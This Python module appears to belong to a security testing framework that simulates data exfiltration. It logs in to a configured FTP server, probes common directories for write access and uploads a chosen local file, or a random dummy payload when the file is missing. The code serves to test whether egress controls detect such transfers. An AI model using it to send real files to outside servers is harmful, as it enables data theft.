from ftplib import FTP, all_errors
from executor.BaseTest import BaseTest
import os
from io import BytesIO

class FTPExfiltrationTest(BaseTest):
    TEST_NAME = "ftp_exfil"
    CATEGORY = "exfiltration"

    def run(self, config: dict) -> dict:
        cfg = {**self.load_config(), **config}

        server = cfg.get("ftp_server")
        port = int(cfg.get("ftp_port", 21))
        username = cfg.get("ftp_user")
        password = cfg.get("ftp_pass")
        local_file = cfg.get("local_file")
        remote_path = cfg.get("remote_path") or os.path.basename(local_file)

        # Validate required fields
        if not all([server, username, password, local_file]):
            return {"status": "error", "error": "Missing required config fields."}

        # Ensure payload exists and is a proper binary file
        if not os.path.exists(local_file) or os.path.getsize(local_file) == 0:
            self._generate_dummy_payload(local_file)

        @self.log_command(name="FTP Upload")
        def ftp_upload():
            try:
                with FTP() as ftp:

                    ftp.connect(server, port)
                    ftp.login(username, password)
                    ftp.set_pasv(True)

                    # Debug: capture initial directory and listing
                    start_dir = ftp.pwd()
                    try:
                        listing = ftp.nlst()
                    except all_errors:
                        listing = []
                    debug_info = f"DEBUG: start_dir={start_dir}, listing={listing}"

                    # Detect writable directory using in-memory test payload
                    test_data = BytesIO(b"PING_TEST")
                    writable_dirs = ["", "upload", "incoming", "public"]
                    chosen_dir = None
                    for d in writable_dirs:
                        try:
                            ftp.cwd(d) if d else None
                            ftp.storbinary("STOR .write_test", test_data)
                            ftp.delete(".write_test")
                            chosen_dir = d
                            break
                        except all_errors:
                            test_data.seek(0)
                            continue

                    if chosen_dir is None:
                        return {"stdout": "", "stderr": f"No writable directory. {debug_info}", "return_code": 1}

                    # Perform actual file upload
                    with open(local_file, 'rb') as f:
                        ftp.storbinary(f"STOR {remote_path}", f)

                    dest_dir = (chosen_dir + "/").lstrip('/')
                    dest = f"{server}:{port}/{dest_dir}{remote_path}"
                    return {
                        "stdout": f"Uploaded to ftp://{dest}",
                        "stderr": f"{debug_info}, used_dir={chosen_dir}",
                        "return_code": 0
                    }
            except all_errors as e:
                return {"stdout": "", "stderr": str(e), "return_code": 1}

        res = ftp_upload()
        result_dict = {
            "status": "success" if res["return_code"] == 0 else "failure",
            "output": res.get("stdout", ""),
            "comment": res.get("stderr", ""),
            "executed_command": f"STOR {remote_path}",
            "dest_ip": server,
            "dest_port": port,
            "Proxy": cfg.get("proxy")
        }
        self.log_result(result_dict)
        return result_dict

    def _generate_dummy_payload(self, path: str):
        os.makedirs(os.path.dirname(path), exist_ok=True) if os.path.dirname(path) else None
        # Write a small binary payload to ensure correct file type
        with open(path, 'wb') as f:
            f.write(os.urandom(512))  # 512 bytes of random data
            f.flush()
            os.fsync(f.fileno())
